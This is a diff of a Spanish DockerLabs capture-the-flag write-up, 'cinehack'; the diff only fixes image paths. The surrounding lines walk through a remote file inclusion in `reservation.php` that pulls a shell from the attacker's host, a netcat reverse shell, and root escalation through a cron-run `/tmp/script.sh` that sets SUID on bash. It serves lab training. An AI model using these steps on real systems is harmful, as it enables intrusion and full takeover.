@@ -69,7 +69,7 @@ http://127.17.0.2 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPSer
 
 El sitio web es estático y tiene un contenido mínimo.
 
-![](assets/img/dockerlabs-writeup-cinehack/cinehack1_1.png)
+![](/assets/img/dockerlabs-writeup-cinehack/cinehack1_1.png)
 
 Lo único destacable es el título "Bienvenido a Cinema DL". La extensión `.dl` se utiliza en esta plataforma para nombrar dominios locales propios de DockerLabs. Dado que `.dl` es un dominio interno, agregué una entrada en `/etc/hosts` para acceder a la web correctamente.
 
@@ -79,11 +79,11 @@ Lo único destacable es el título "Bienvenido a Cinema DL". La extensión `.dl`
 
 Ahora el contenido del sitio cambia, mostrando más información. Aparecen cinco películas disponibles para reservar.
 
-![](assets/img/dockerlabs-writeup-cinehack/cinehack1_2.png)
+![](/assets/img/dockerlabs-writeup-cinehack/cinehack1_2.png)
 
 Sin embargo, solo puedo acceder a la película "El tiempo que tenemos", donde se encuentra un formulario para realizar una reserva seleccionando un asiento.
 
-![](assets/img/dockerlabs-writeup-cinehack/cinehack1_3.png)
+![](/assets/img/dockerlabs-writeup-cinehack/cinehack1_3.png)
 
 Los datos del formulario parecen enviarse atraves de `reservation.php`, lo que es un punto de interés.
 
@@ -94,7 +94,7 @@ Los datos del formulario parecen enviarse atraves de `reservation.php`, lo que e
 + http://cinema.dl/reservation.php (CODE:200|SIZE:1779)
 ```
 
-![](assets/img/dockerlabs-writeup-cinehack/cinehack1_4.png)
+![](/assets/img/dockerlabs-writeup-cinehack/cinehack1_4.png)
 
 
 ---
@@ -108,7 +108,7 @@ Host: cinema.dl
 name=Juan+P%C3%A9rez&email=juanperez%40example.com&phone=%2B34+600+123+456&problem_url=http%3A%2Ftusitio.com%2Fuploads%2Fwebshell.php
 ```
 
-![](assets/img/dockerlabs-writeup-cinehack/cinehack1_5.png)
+![](/assets/img/dockerlabs-writeup-cinehack/cinehack1_5.png)
 
 La vulnerabilidad se encuentra en el parámetro `problem_url`, el cual parece permitir la carga de archivos remotos. Para explotar esta falla y subir un archivo malicioso, es necesario modificar la solicitud y agregar el parámetro en la URL en lugar del cuerpo.
 
@@ -137,7 +137,7 @@ Y envié la solicitud para cargar la shell en el sistema objetivo.
 POST /reservation.php?problem_url=http%3a//192.168.0.171%3a8000/shell.php HTTP/1.1
 ```
 
-![](assets/img/dockerlabs-writeup-cinehack/cinehack1_6.png)
+![](/assets/img/dockerlabs-writeup-cinehack/cinehack1_6.png)
 
 Para encontrar la ubicación del archivo subido, realicé un escaneo exhaustivo de la máquina sin éxito. Solo logré identificar la ruta correcta tras generar una lista de nombres basada en los actores de las películas en cartelera.
 
@@ -149,7 +149,7 @@ Para encontrar la ubicación del archivo subido, realicé un escaneo exhaustivo 
 /home/kali/Documents/dockerlabs/cinehack:-$ wfuzz -u http://cinema.dl/FUZZ/ -w users.txt --hc=404 -c -t 200
 ```
 
-![](assets/img/dockerlabs-writeup-cinehack/cinehack1_7.png)
+![](/assets/img/dockerlabs-writeup-cinehack/cinehack1_7.png)
 
 A través de este método, descubrí que el archivo fue almacenado en el directorio andrewgarfield. Procedí a ejecutar la shell para obtener acceso al sistema.
 
@@ -158,7 +158,7 @@ A través de este método, descubrí que el archivo fue almacenado en el directo
 	listening on [any] 4321 ...
 ```
 
-![](assets/img/dockerlabs-writeup-cinehack/cinehack1_8.png)
+![](/assets/img/dockerlabs-writeup-cinehack/cinehack1_8.png)
 
 ```terminal
 	... connect to [192.168.0.171] from (UNKNOWN) [192.168.0.171] 34910
@@ -235,11 +235,11 @@ uid=1001(boss) gid=1001(boss) groups=1001(boss),100(users)
 
 Después de un tiempo, la sesión como `boss` se cerró automáticamente. Investigando la causa, encontré un script en `/opt/update.sh` que terminaba los procesos de este usuario.
 
-![](assets/img/dockerlabs-writeup-cinehack/cinehack2_1.png)
+![](/assets/img/dockerlabs-writeup-cinehack/cinehack2_1.png)
 
 Además, encontré que en `/var/spool/cron/crontabs/root.sh` había una tarea cron que ejecutaba periódicamente dos scripts, `/opt/update.sh` y `/tmp/script.sh`.
 
-![](assets/img/dockerlabs-writeup-cinehack/cinehack3_1.png)
+![](/assets/img/dockerlabs-writeup-cinehack/cinehack3_1.png)
 
 El script `/tmp/script.sh` se ejecuta con privilegios de `root` y no existe en el sistema, lo que me permite crearlo con contenido malicioso. Para aprovechar esto, lo configuro para establecer el bit SUID en `/bin/bash`, lo que permitirá ejecutar Bash con privilegios elevados.
 
